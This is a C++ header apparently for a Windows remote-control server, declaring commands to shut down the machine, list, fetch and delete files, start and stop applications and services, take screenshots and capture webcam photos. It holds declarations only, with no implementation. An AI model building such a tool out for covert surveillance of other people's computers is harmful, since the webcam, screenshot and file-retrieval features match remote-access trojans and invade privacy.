#include "server_socket.h"
#include <unordered_map>
#include <thread>
#include <gdiplus.h>
#include <dshow.h> 
#include <sstream>
#pragma comment(lib, "gdiplus.lib")

#define SUCCESS 0
#define FAILURE 1


using namespace Gdiplus;


class Command;
class ReceiveCommand;
class ShutdownCommand;
class ListFileCommand;
class GetFileCommand;
class DeleteFileCommand;
class ListAppCommand;
class StartAppCommand;
class StopAppCommand;
class ListSerCommand;
class StartSerCommand;
class StopSerCommand;
class TakePhotoCommand;
class StartRecordCommand;
class StopRecordCommand;

class Command{
protected:
    static const std::string directory;
    int status;
    std::string file_name;   // name of the return file
    std::string message;
public:
    virtual void execute(Server& server, const std::string& param) = 0;
    std::string createResponse();
};

class ReceiveCommand {
    private:
        std::string command;
        std::string parameter;

        std::unordered_map<std::string, Command*> commands;

    public:
        ReceiveCommand();
        ~ReceiveCommand();
        void getLatestCommand(Server& server);
        void executeCommand(Server& server);
		void process(Server& server); //* for testing only  
};

class ShutdownCommand : public Command{
public:
    void execute(Server& server, const std::string& param) override;
};

class ListFileCommand : public Command{
private:
    std::string output_file;
    int listFile(const std::string& path);
public:
    void execute(Server& server, const std::string& param) override;
};

class GetFileCommand : public Command{
public:
    void execute(Server& server, const std::string& param) override;
};


class DeleteFileCommand : public Command{
private:
    void deleteFile(Server& server, const std::string& filename);
public:
    void execute(Server& server, const std::string& param) override;
};

class ListAppCommand : public Command{
    public:
        void execute(Server& server, const std::string& param) override;
};


class StartAppCommand : public Command{
    public:
        void execute(Server& server, const std::string& param) override;
};


class StopAppCommand : public Command{
    public:
        void execute(Server& server, const std::string& param) override;
};

class RestartCommand : public Command{
    public:
        void execute(Server& server, const std::string& param) override;
};

class ScreenshotCommand : public Command{
    public:
        void execute(Server& server, const std::string& param) override;
};

class ListSerCommand : public Command{
private:
    void listRunningServices();
public:
    void execute(Server& server, const std::string& param) override;
};

class TakePhotoCommand : public Command{
private:
    std::string detectWebcam();
    int takePhoto();
public:
    void execute(Server& server, const std::string& param) override;
};